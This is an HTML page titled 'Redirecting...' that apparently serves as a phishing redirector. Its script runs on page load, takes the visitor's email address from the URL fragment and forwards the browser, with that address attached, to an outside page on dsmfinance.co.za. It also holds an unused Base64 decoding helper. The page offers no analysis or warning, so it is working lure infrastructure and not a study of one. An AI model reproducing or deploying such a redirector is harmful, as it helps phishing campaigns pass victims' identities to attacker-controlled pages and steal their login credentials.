<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

<script>
function b64DecodeUnicode(str) {
    // Decodes a Base64-encoded string
    return decodeURIComponent(atob(str).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
}

function redirectPage() {
    var query = window.location.href;
    console.log("Full URL:", query);
    
    var res = query.split("#");
    var data2 = res.length > 1 ? res[1] : null;

    if (data2) {
        var realemailID = decodeURIComponent(data2); // Converts %40 back to @
        console.log("Decoded Email:", realemailID);
        
        window.location.href = "https://dsmfinance.co.za/mralink.html?eta=" + realemailID;
    } else {
        console.log("No email found, redirecting...");
        window.location.href = "https://dsmfinance.co.za/mralink.html?eta=";
    }
}

redirectPage();
</script>

</body>
</html>
